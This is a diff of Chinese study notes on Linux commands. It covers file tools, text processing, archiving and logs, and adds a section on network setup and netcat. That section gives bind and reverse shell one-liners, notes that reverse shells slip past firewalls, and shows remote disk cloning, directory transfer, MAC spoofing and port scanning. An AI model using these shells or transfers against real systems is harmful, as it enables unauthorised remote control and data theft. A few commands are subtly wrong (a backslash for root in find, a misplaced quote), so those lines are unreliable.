@@ -22,41 +22,41 @@
 - `pwd` 获取当前路径
 - 绝对路径 以根目录`/`为起点，以所要到的目录为终点，表现形式`/usr/local/bin`
 - 相对路径 以当前目录`.`为起点，以所要到的目录为终点，可以省略`.`
-- $\color{red}{touch}$
+- touch
   
   + 主要作用是更改已有文件的时间戳（如：最近访问时间，最近修改时间），在不加任何参数的情况下，只指定文件名，可以创建一个空白文件（不会覆盖已有同名文件）`touch test`
-- $\color{red}{mkdir}$
+- mkdir
   + 创建一个空目录，同时也可以指定创建目录的文件权限属性 `mkdir mydir`创建名为mydir的目录
-  + 使用$\color{red}{-p}$参数，同时创建父目录（如果父目录不存在） `mkdir father/son/grandson`
-- $\color{red}{cp}$
+  + 使用-p参数，同时创建父目录（如果父目录不存在） `mkdir father/son/grandson`
+- cp
   + 复制一个文件到指定目录 `cp test father/son/grandson`
   + 成功复制文件夹需使用$\color{red}{-r}$参数，表示递归复制
   ```bash
   mkdir family
   cp -r father family
   ```
-- $\color{red}{rm}$
+- rm
   + 删除文件 `rm test`
   + 删除目录 `rm -r family`
-- $\color{red}{mv}$
+- mv
   + 移动文件（剪切） `mv 源文件 目的目录`
   + 重命名文件 `mv 源文件名 新文件名`
-- $\color{red}{cat}$
+- cat
   + 查看文件
-  + $\color{red}{-n}$ 显示行号
-- $\color{red}{more}$
+  + -n 显示行号
+- more
   
-  + 更加专业地阅读文件内容，默认显示第一屏内容，使用$\color{red}{Enter}$键向下滚动一行，使用$\color{red}{Space}$键向下滚动一屏，使用$\color{red}{h}$显示帮助，使用$\color{red}{q}$退出
-- $\color{red}{less}$
+  + 更加专业地阅读文件内容，默认显示第一屏内容，使用Enter键向下滚动一行，使用Space键向下滚动一屏，使用h显示帮助，使用q退出
+- less
   + less 的用法比起 more 、tail更加的有弹性。在 more 的时候，我们并没有办法向前面翻， 只能往后面看，但若使用了 less 时，就可以使用 $\color{red}{pageup}$ $\color{red}{pagedown}$ 等按键的功能来往前往后翻看文件，更容易用来查看一个文件的内容 
   + 空格键 滚动一行
   + 回车键 滚动一页
   + g 跳到文件头  
   + G 跳到文件尾部
-- $\color{red}{file}$
+- file
   
   + 查看文件类型
-- $\color{red}{cut}$
+- cut
   + 语法 `cut [-args] [file]`
   +  cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。
   + -d ：自定义分隔符，默认为制表符
@@ -72,7 +72,7 @@
     # 2到5之间的（包含第五个）
     cut /etc/passwd -c 2-5
   ```
-- $\color{red}{grep}$
+- grep
   + grep命令是很强大的，也是相当常用的一个命令，它结合正则表达式可以实现很复杂却很高效的匹配和查找
   + `grep [命令选项] 用于匹配的表达式 [文件]`
   + `-c` 统计以模式匹配的数目
@@ -84,33 +84,33 @@
   + `-A n` 除了匹配行之外，还列出后面的n行
   + `-B n` 除了匹配行之外，还列出前面的n行
   + `-E` 使用扩展正则表达式 `echo 'zero\nzo\nzoo' | grep -E 'zo{1}'`
-- $\color{red}{wc}$
+- wc
   
   + wc 命令用于统计并输出一个文件中行、单词和字节的数目
-- $\color{red}{sort}$
+- sort
   + 将输入按照一定方式排序，然后再输出,它支持的排序有按字典排序,数字排序，按月份排序，随机排序，反转排序，指定特定字段进行排序等等
   + -n 按照数值进行排序
   + -r 降序排列
   + -k 按照指定的列进行排序
   + -t 指定分隔符，默认是空格
-- $\color{red}{uniq}$
+- uniq
   + 过滤或者输出连续重复行
   + -c 在每列旁边显示该行重复出现的次数
   + -d 仅显示重复出现的行列
   + -u 仅显示出现一次的行列
-- $\color{red}{tr}$
+- tr
   + 删除一段文本信息中的某些文字或者对其转换
   + -d 删除指定的字符
   + -s 删除连续重复出现的指定字符
   + `tr '[a-z]' '[A-Z]'`
-- $\color{red}{join}$
+- join
   + 将两个文件指定栏位同样地行连接起来，类似sql语句中的join操作
   + 语法 `join [option] file1 file2`默认使用空格作为分隔符，根据两份文件第1栏的内容进行连接
   + -t 指定分隔符
   + -i 忽略大小写
   + -1 指定第1份文件用哪一栏内容进行对比
   + -2 指定第2份文件用哪一栏内容进行对比
-- $\color{red}{paste}$
+- paste
   + 直接将多个文件的每一行连接起来，默认使用tab隔开
   + -d 指定分隔符
   + -s 每个文件的内容单独放在1行
@@ -124,10 +124,11 @@
   + which 使用which确定是否安装了某个软件，因为它只从PATH环境变量指定的目录搜索命令
   + find 不但可以通过文件类型、文件名进行查找而且可以根据文件的属性（如文件的时间戳，文件的权限等）进行搜索， find 的第一个参数是要搜索的地方。find [path] [option] [action]
   	- `find -name 'filename'`
+  	- `find \ -iname 'filename'`从根目录开始查找，不区分大小写。
   
   
 ## 文件打包与压缩
-- $\color{red}{zip}$
+- zip
   + `zip -r -q -o outputfile.zip input` 将input（可以是文件或文件夹）打包压缩到文件outputfile.zip，-r 参数表示递归打包包含子目录的全部内容，-q 参数表示为安静模式，即不向屏幕输出信息，-o，表示输出文件，需在其后紧跟打包输出文件名
   + 设置压缩级别<br>
     `zip -r -9 -q -o outputfile.zip input` 9 表示体积最小但耗时最久<br>
@@ -139,12 +140,12 @@
   + -l 将LF转变为CR LF。在 Windows 为 CR+LF（Carriage-Return+Line-Feed：回车加换行），而在 Linux/Unix 上为 LF（换行），所以如果在不加处理的情况下，在 Linux 上编辑的文本，在 Windows 系统上打开可能看起来是没有换行的。<br>
     `zip -r -l -o outputfile.zip input`
   
-- $\color{red}{unzip}$
+- unzip
   + `unzip outputfile.zip`
   + `unzip -q outputfile.zip -d dir` 使用安静模式，将文件解压到指定目录
   + -l 显示压缩文件中的文件列表
   
-- $\color{red}{tar}$
+- tar
   + `tar -P -cf output.tar input`-P 保留绝对路径符，-c 表示创建一个 tar 包文件，-f 用于指定创建的文件名，注意文件名必须紧跟在 -f 参数之后
   + `tar -xf output.tar -C dir` 解包一个文件（-x 参数）到指定路径的已存在目录（-C 参数）
   + `tar -tf output.tar`只查看不解包文件 -t 参数
@@ -201,10 +202,6 @@
 - 选择执行多条命令
   + 环境变量dollar?指示上一次命令执行的返回结果，成功为0，否则为1
   + `&&` 如果上一次命令执行结果为0则执行后面的命令，否则跳过；
-
-
-## new
-
   + `||` 如果上一次命令执行结果为1则执行后面的命令，否则跳过；
   + `which cowsay>/dev/null && echo "exist" || echo "not exist"`
 
@@ -402,3 +399,100 @@ Linux大部分发行版都内置syslog系统日志，常见的日志一般存放
 | syslog             | 系统信息记录                                                 |
 
  wtmp，lastlog这两个日志并不是 ASCII 文件而是被编码成了二进制文件，查看的方法是使用 last 与 lastlog 工具来提取其中的信息。
+
+
+
+## 网络配置
+
+`dhclient eth0` 访问dhcp服务器，重新获得ip地址
+
+`ifconfig eth0 down`停用网卡eth0
+
+`ifconfig eth0 up`启用网卡eth0
+
+`macchanger -m 00:11:11:11:11:11 eth0`修改网卡eth0的MAC地址，需要先停用该网卡
+
+`netstat -pantu`查看当前tcp\udp连接
+
++ ifconfig eth0 192.168.2.110/24
+
++ route add default gw 192.168.110.1 设置默认网关
+
++ netstat -nr 查看路由表
+
++ echo 'nameserver 8.8.8.8 >> /etc/resolv.conf'配置DNS服务器
+
++ 上述操作在电脑重启后失效。修改网卡配置文件/etc/network/interface
+
+  ```
+  auto eth0
+  iface eth0 inet static //静态ip
+  address 192.168.20.1  //ip地址
+  netmask 255.255.255.255  //子网掩码
+  gateway 192.168.20.2  //网关
+  broadcast 192.168.20.255 //广播地址
+  dns.nameservers 192.168.1.1 8.8.8.8  //dns服务器
+  up route add -net 172.16.5.0/24  //添加子网路由
+  ```
+
+
+
+
+
+计算base64，`base64`，输入字符串，再按ctrl+d得到base64编码结果。
+
+## netcat
+
+nc -vn 192.168.2.2 80 
+
+`nc -l -p 4444` 服务器打开端口4444并开始侦听
+
+服务器：`nc -l -p 4444 > r.txt` 侦听4444端口，并将接收的内容写入文件r.txt
+
+客户端：`ps aux | nc -nv 服务器ip地址 4444 -q 1`将客户端进程信息发送给服务器，`-q 1 `nc输入完成后1s钟断开连接
+
+### nc传递文件
+
+文件接收方：`nc -lp 4444 > filename`
+
+文件发送方：`nc -nv 接收方ip 4444 < filename -q 1`
+
+或
+
+文件发送方：`nc -q 1 -lp 4444 < filename`
+
+文件接收方：`nc -nv 发送方ip 4444 > filename`
+
+### nc发送文件夹
+
+发送方：`tar -cvf - dirpath | nc -lp 4444 -q 1` 需要注意`-cvf`后面存在`-`
+
+接收方：`nc -nv 发送方ip 4444 | tar -xvf -`
+
+### nc扫描端口
+
+`nc -nvz 目标ip 1-65535` 扫描tcp端口
+
+### nc远程克隆硬盘
+
+接收方： `nc -lp 4444 | dd of=/dev/sda`
+
+被克隆方：`dd if=/dev/sda | nc -nv 接收方ip 4444 -q 1`
+
+### nc远程控制
+
+**正向shell**
+
+控制端：`nc -nv 被控端ip 4444`
+
+被控端：`nc -lp 4444 -c bash`
+
+**反向shell**
+
+控制端：`nc -lp 4444`
+
+被控端：`nc -nv 控制端ip 4444 -c bash `
+
+一般防火墙拦截从外到内的数据，对从内向外的数据不做限制，所以使用反向shell。
+
+不同版本的nc的参数不尽相同，有的版本获取shell需使用`-e`
